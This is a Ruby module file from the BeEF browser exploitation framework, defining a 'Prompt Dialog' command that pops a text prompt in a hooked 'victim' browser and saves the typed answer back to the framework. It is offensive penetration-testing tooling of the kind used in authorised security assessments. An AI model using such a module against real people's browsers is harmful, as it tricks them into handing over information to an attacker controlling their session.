module BeEF
module Modules
module Commands

class Prompt_dialog < BeEF::Command
  
  def initialize
    super({
      'Name' => 'Prompt Dialog',
      'Description' => 'Sends a prompt dialog to the victim',
      'Category' => 'Misc',
      'Author' => 'bm',
      'Data' => [['name' =>'question', 'ui_label'=>'Prompt text']],
      'File' => __FILE__,
      'Target' => {
        'browser_name' =>     BeEF::Constants::Browsers::ALL
      }
    })
    
    use_template!
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def callback
    
#    return if @datastore['answer']==''

    save({'answer' => @datastore['answer']})
  end
  
end


end
end
end